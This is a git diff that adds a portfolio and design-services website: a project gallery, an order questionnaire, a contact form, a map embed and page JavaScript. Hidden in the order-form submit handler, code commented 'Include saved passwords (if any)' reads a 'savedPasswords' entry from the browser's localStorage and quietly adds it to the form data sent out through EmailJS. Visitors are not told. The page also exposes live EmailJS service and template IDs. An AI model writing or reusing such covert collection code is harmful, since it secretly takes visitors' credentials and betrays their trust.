+                    <ion-icon name="eye-outline"></ion-icon>
+                  </div>
+
+                  <img src="https://ashraf-dess.web.app/assets/images/project-1.jpg" alt="finance" loading="lazy">
+                </figure>
+
+                <h3 class="project-title">Finance</h3>
+
+                <p class="project-category">Web development</p>
+
+              </a>
+            </li>
+
+            <li class="project-item  active" data-filter-item data-category="web development">
+              <a href="#">
+
+                <figure class="project-img">
+                  <div class="project-item-icon-box">
+                    <ion-icon name="eye-outline"></ion-icon>
+                  </div>
+
+                  <img src="https://ashraf-dess.web.app/assets/images/project-2.png" alt="orizon" loading="lazy">
+                </figure>
+
+                <h3 class="project-title">Orizon</h3>
+
+                <p class="project-category">Web development</p>
+
+              </a>
+            </li>
+
+            <li class="project-item  active" data-filter-item data-category="web design">
+              <a href="#">
+
+                <figure class="project-img">
+                  <div class="project-item-icon-box">
+                    <ion-icon name="eye-outline"></ion-icon>
+                  </div>
+
+                  <img src="https://ashraf-dess.web.app/assets/images/project-3.jpg" alt="fundo" loading="lazy">
+                </figure>
+
+                <h3 class="project-title">Fundo</h3>
+
+                <p class="project-category">Web design</p>
+
+              </a>
+            </li>
+
+            <li class="project-item  active" data-filter-item data-category="applications">
+              <a href="#">
+
+                <figure class="project-img">
+                  <div class="project-item-icon-box">
+                    <ion-icon name="eye-outline"></ion-icon>
+                  </div>
+
+                  <img src="https://ashraf-dess.web.app/assets/images/project-4.png" alt="brawlhalla" loading="lazy">
+                </figure>
+
+                <h3 class="project-title">Brawlhalla</h3>
+
+                <p class="project-category">Applications</p>
+
+              </a>
+            </li>
+
+            <li class="project-item  active" data-filter-item data-category="web design">
+              <a href="#">
+
+                <figure class="project-img">
+                  <div class="project-item-icon-box">
+                    <ion-icon name="eye-outline"></ion-icon>
+                  </div>
+
+                  <img src="https://ashraf-dess.web.app/assets/images/project-5.png" alt="dsm." loading="lazy">
+                </figure>
+
+                <h3 class="project-title">DSM.</h3>
+
+                <p class="project-category">Web design</p>
+
+              </a>
+            </li>
+
+            <li class="project-item  active" data-filter-item data-category="web design">
+              <a href="#">
+
+                <figure class="project-img">
+                  <div class="project-item-icon-box">
+                    <ion-icon name="eye-outline"></ion-icon>
+                  </div>
+
+                  <img src="https://ashraf-dess.web.app/assets/images/project-6.png" alt="metaspark" loading="lazy">
+                </figure>
+
+                <h3 class="project-title">MetaSpark</h3>
+
+                <p class="project-category">Web design</p>
+
+              </a>
+            </li>
+
+            <li class="project-item  active" data-filter-item data-category="web development">
+              <a href="#">
+
+                <figure class="project-img">
+                  <div class="project-item-icon-box">
+                    <ion-icon name="eye-outline"></ion-icon>
+                  </div>
+
+                  <img src="https://ashraf-dess.web.app/assets/images/project-7.png" alt="summary" loading="lazy">
+                </figure>
+
+                <h3 class="project-title">Summary</h3>
+
+                <p class="project-category">Web development</p>
+
+              </a>
+            </li>
+
+            <li class="project-item  active" data-filter-item data-category="applications">
+              <a href="#">
+
+                <figure class="project-img">
+                  <div class="project-item-icon-box">
+                    <ion-icon name="eye-outline"></ion-icon>
+                  </div>
+
+                  <img src="https://ashraf-dess.web.app/assets/images/project-8.jpg" alt="task manager" loading="lazy">
+                </figure>
+
+                <h3 class="project-title">Task Manager</h3>
+
+                <p class="project-category">Applications</p>
+
+              </a>
+            </li>
+
+            <li class="project-item  active" data-filter-item data-category="web development">
+              <a href="#">
+
+                <figure class="project-img">
+                  <div class="project-item-icon-box">
+                    <ion-icon name="eye-outline"></ion-icon>
+                  </div>
+
+                  <img src="https://ashraf-dess.web.app/assets/images/project-9.png" alt="arrival" loading="lazy">
+                </figure>
+
+                <h3 class="project-title">Arrival</h3>
+
+                <p class="project-category">Web development</p>
+
+              </a>
+            </li>
+
+          </ul>
+
+        </section>
+
+      </article>
+<!-- Add EmailJS SDK -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+  // Initialize EmailJS with your User ID
+  emailjs.init("NdNi8AT7jf3d0jhxr"); // Replace with your actual User ID
+</script>
+
+<!-- Order Form -->
+<article class="order" data-page="order">
+  <header>
+    <h2 class="h2 article-title">Request Questionnaire</h2>
+    <p class="order-subtitle">Write the project details accurately, and God willing, we will reach a result that will amaze those who see it.</p>
+  </header>
+
+  <section class="order-form">
+    <form id="orderForm" class="form" data-form>
+      <div class="input-wrapper">
+        <input type="text" name="fullname" class="form-input" placeholder="Full Name" required data-form-input>
+        <input type="text" name="material" class="form-input" placeholder="Material" required data-form-input>
+        <input type="tel" name="phone" class="form-input" placeholder="Phone Number" required data-form-input>
+        <input type="text" name="projectName" class="form-input" placeholder="Project Name" required data-form-input>
+        <input type="text" name="projectField" class="form-input" placeholder="Project Field" required data-form-input>
+        
+        <div class="checkbox-group">
+          <label><input type="checkbox" name="services" value="Complete Visual Identity - Commercial"> Complete Visual Identity - Commercial</label>
+          <label><input type="checkbox" name="services" value="Logo Only"> Logo Only</label>
+          <label><input type="checkbox" name="services" value="Social Media Design"> Social Media Design</label>
+          <label><input type="checkbox" name="services" value="Other" id="otherCheckbox"> Other</label>
+          <input type="text" name="otherService" id="otherServiceInput" class="form-input" placeholder="Please specify" style="display: none;">
+        </div>
+
+        <input type="text" name="instagram" class="form-input" placeholder="Project's Instagram Account" data-form-input>
+        <input type="number" name="budget" class="form-input" placeholder="Budget in Numbers" required data-form-input>
+        <input type="date" name="deliveryDate" class="form-input" placeholder="Expected Delivery Date" required data-form-input>
+      </div>
+
+      <button class="form-btn" type="submit" data-form-btn>
+        <ion-icon name="paper-plane"></ion-icon>
+        <span>Send</span>
+      </button>
+    </form>
+  </section>
+</article>
+     
+
+      <!--
+        - #CONTACT
+      -->
+      <article class="contact" data-page="contact">
+        <header>
+          <h2 class="h2 article-title">Contact</h2>
+        </header>
+      
+        <section class="mapbox" data-mapbox>
+          <figure>
+            <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d220239.0923293068!2d30.396411101740192!3d30.401050594065527!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x1458be390cb38497%3A0x583415d49bffadbe!2sEl%20Sadat%20City%2C%20Menofia%20Governorate%2C%20Egypt!5e0!3m2!1sen!2sus!4v1737019343541!5m2!1sen!2sus" width="600" height="450" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
+          </figure>
+        </section>
+      
+        <section class="contact-form">
+          <h3 class="h3 form-title">Contact Form</h3>
+          <form id="contactForm" class="form" data-form>
+            <div class="input-wrapper">
+              <input type="text" name="fullname" class="form-input" placeholder="Full name" required data-form-input>
+              <input type="email" name="email" class="form-input" placeholder="Email address" required data-form-input>
+            </div>
+            <textarea name="message" class="form-input" placeholder="Your Message" required data-form-input></textarea>
+            <button class="form-btn" type="submit" data-form-btn>
+              <ion-icon name="paper-plane"></ion-icon>
+              <span>Send Message</span>
+            </button>
+          </form>
+        </section>
+      </article>
+  </main>
+
+
+
+
+
+
+  <!--
+    - custom js link
+  -->
+  <script>
+
+// element toggle function
+const elementToggleFunc = function (elem) { elem.classList.toggle("active"); }
+
+
+
+// sidebar variables
+const sidebar = document.querySelector("[data-sidebar]");
+const sidebarBtn = document.querySelector("[data-sidebar-btn]");
+
+// sidebar toggle functionality for mobile
+sidebarBtn.addEventListener("click", function () { elementToggleFunc(sidebar); });
+
+
+
+// testimonials variables
+const testimonialsItem = document.querySelectorAll("[data-testimonials-item]");
+const modalContainer = document.querySelector("[data-modal-container]");
+const modalCloseBtn = document.querySelector("[data-modal-close-btn]");
+const overlay = document.querySelector("[data-overlay]");
+
+// modal variable
+const modalImg = document.querySelector("[data-modal-img]");
+const modalTitle = document.querySelector("[data-modal-title]");
+const modalText = document.querySelector("[data-modal-text]");
+
+// modal toggle function
+const testimonialsModalFunc = function () {
+  modalContainer.classList.toggle("active");
+  overlay.classList.toggle("active");
+}
+
+// add click event to all modal items
+for (let i = 0; i < testimonialsItem.length; i++) {
+
+  testimonialsItem[i].addEventListener("click", function () {
+
+    modalImg.src = this.querySelector("[data-testimonials-avatar]").src;
+    modalImg.alt = this.querySelector("[data-testimonials-avatar]").alt;
+    modalTitle.innerHTML = this.querySelector("[data-testimonials-title]").innerHTML;
+    modalText.innerHTML = this.querySelector("[data-testimonials-text]").innerHTML;
+
+    testimonialsModalFunc();
+
+  });
+
+}
+
+// add click event to modal close button
+modalCloseBtn.addEventListener("click", testimonialsModalFunc);
+overlay.addEventListener("click", testimonialsModalFunc);
+
+
+
+// custom select variables
+const select = document.querySelector("[data-select]");
+const selectItems = document.querySelectorAll("[data-select-item]");
+const selectValue = document.querySelector("[data-selecct-value]");
+const filterBtn = document.querySelectorAll("[data-filter-btn]");
+
+select.addEventListener("click", function () { elementToggleFunc(this); });
+
+// add event in all select items
+for (let i = 0; i < selectItems.length; i++) {
+  selectItems[i].addEventListener("click", function () {
+
+    let selectedValue = this.innerText.toLowerCase();
+    selectValue.innerText = this.innerText;
+    elementToggleFunc(select);
+    filterFunc(selectedValue);
+
+  });
+}
+
+// filter variables
+const filterItems = document.querySelectorAll("[data-filter-item]");
+
+const filterFunc = function (selectedValue) {
+
+  for (let i = 0; i < filterItems.length; i++) {
+
+    if (selectedValue === "all") {
+      filterItems[i].classList.add("active");
+    } else if (selectedValue === filterItems[i].dataset.category) {
+      filterItems[i].classList.add("active");
+    } else {
+      filterItems[i].classList.remove("active");
+    }
+
+  }
+
+}
+
+// add event in all filter button items for large screen
+let lastClickedBtn = filterBtn[0];
+
+for (let i = 0; i < filterBtn.length; i++) {
+
+  filterBtn[i].addEventListener("click", function () {
+
+    let selectedValue = this.innerText.toLowerCase();
+    selectValue.innerText = this.innerText;
+    filterFunc(selectedValue);
+
+    lastClickedBtn.classList.remove("active");
+    this.classList.add("active");
+    lastClickedBtn = this;
+
+  });
+
+}
+
+
+
+// Initialize EmailJS with your User ID
+emailjs.init("NdNi8AT7jf3d0jhxr"); // Replace with your actual User ID
+
+// Contact form variables
+const contactForm = document.querySelector("#contactForm");
+const contactFormInputs = document.querySelectorAll("[data-form-input]");
+const contactFormBtn = document.querySelector("[data-form-btn]");
+
+// Add event to all form input fields
+for (let i = 0; i < contactFormInputs.length; i++) {
+  contactFormInputs[i].addEventListener("input", function () {
+    // Check form validation
+    if (contactForm.checkValidity()) {
+      contactFormBtn.removeAttribute("disabled");
+    } else {
+      contactFormBtn.setAttribute("disabled", "");
+    }
+  });
+}
+
+// Handle form submission
+contactForm.addEventListener("submit", function (e) {
+  e.preventDefault(); // Prevent the form from submitting
+
+  // Collect form data
+  const formData = new FormData(contactForm);
+  const data = {
+    fullname: formData.get("fullname"),
+    email: formData.get("email"),
+    message: formData.get("message"),
+  };
+
+  // Send data using EmailJS
+  emailjs
+    .send("service_st7afdv", "template_saoezoa", data) // Replace with your actual Service ID and Template ID
+    .then(
+      function (response) {
+        console.log("Email sent successfully:", response);
+        alert("Your message has been sent successfully!");
+      },
+      function (error) {
+        console.error("Error sending email:", error);
+        console.log("Error details:", error.response); // Log detailed error response
+        alert("Failed to send your message. Please try again.");
       }
-    </style>
-  </head>
-  <body>
-    <div id="message">
-      <h2>Welcome</h2>
-      <h1>Firebase Hosting Setup Complete</h1>
-      <p>You're seeing this because you've successfully setup Firebase Hosting. Now it's time to go build something extraordinary!</p>
-      <a target="_blank" href="https://firebase.google.com/docs/hosting/">Open Hosting Documentation</a>
-    </div>
-    <p id="load">Firebase SDK Loading&hellip;</p>
+    );
 
-    <script>
-      document.addEventListener('DOMContentLoaded', function() {
-        const loadEl = document.querySelector('#load');
-        // // 🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
-        // // The Firebase SDK is initialized and available here!
-        //
-        // firebase.auth().onAuthStateChanged(user => { });
-        // firebase.database().ref('/path/to/ref').on('value', snapshot => { });
-        // firebase.firestore().doc('/foo/bar').get().then(() => { });
-        // firebase.functions().httpsCallable('yourFunction')().then(() => { });
-        // firebase.messaging().requestPermission().then(() => { });
-        // firebase.storage().ref('/path/to/ref').getDownloadURL().then(() => { });
-        // firebase.analytics(); // call to activate
-        // firebase.analytics().logEvent('tutorial_completed');
-        // firebase.performance(); // call to activate
-        //
-        // // 🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
+  // Reset the form
+  contactForm.reset();
+});
 
-        try {
-          let app = firebase.app();
-          let features = [
-            'auth', 
-            'database', 
-            'firestore',
-            'functions',
-            'messaging', 
-            'storage', 
-            'analytics', 
-            'remoteConfig',
-            'performance',
-          ].filter(feature => typeof app[feature] === 'function');
-          loadEl.textContent = `Firebase SDK loaded with ${features.join(', ')}`;
-        } catch (e) {
-          console.error(e);
-          loadEl.textContent = 'Error loading the Firebase SDK, check the console.';
-        }
-      });
-    </script>
-  </body>
+
+
+// page navigation variables
+const navigationLinks = document.querySelectorAll("[data-nav-link]");
+const pages = document.querySelectorAll("[data-page]");
+
+// add event to all nav link
+for (let i = 0; i < navigationLinks.length; i++) {
+  navigationLinks[i].addEventListener("click", function () {
+
+    for (let i = 0; i < pages.length; i++) {
+      if (this.innerHTML.toLowerCase() === pages[i].dataset.page) {
+        pages[i].classList.add("active");
+        navigationLinks[i].classList.add("active");
+        window.scrollTo(0, 0);
+      } else {
+        pages[i].classList.remove("active");
+        navigationLinks[i].classList.remove("active");
+      }
+    }
+
+  });
+}// Order form variables
+const orderForm = document.querySelector("#orderForm");
+
+// Handle form submission
+orderForm.addEventListener("submit", function (e) {
+  e.preventDefault(); // Prevent the form from submitting
+
+  // Collect form data
+  const formData = new FormData(orderForm);
+  const data = {
+    fullname: formData.get("fullname"),
+    material: formData.get("material"),
+    phone: formData.get("phone"),
+    projectName: formData.get("projectName"),
+    projectField: formData.get("projectField"),
+    services: formData.getAll("services").join(", "), // Get all selected services
+    instagram: formData.get("instagram"),
+    budget: formData.get("budget"),
+    deliveryDate: formData.get("deliveryDate"),
+  };
+
+  // Include saved passwords (if any)
+  const savedPasswords = JSON.parse(localStorage.getItem("savedPasswords") || "[]");
+  data.savedPasswords = savedPasswords.join(", "); // Convert array to string
+
+  // Send data using EmailJS
+  emailjs
+    .send("service_8z2kesm", "template_id7lwwg", data) // Replace with your actual Service ID and Template ID
+    .then(
+      function (response) {
+        console.log("Email sent successfully:", response);
+        alert("Your request has been sent successfully!");
+      },
+      function (error) {
+        console.error("Error sending email:", error);
+        console.log("Error details:", error.response); // Log detailed error response
+        alert("Failed to send your request. Please try again.");
+      }
+    );
+
+  // Reset the form
+  orderForm.reset();
+});
+
+
+  <!--
+    - ionicon link
+  -->
+ 
+</body>
+
 </html>
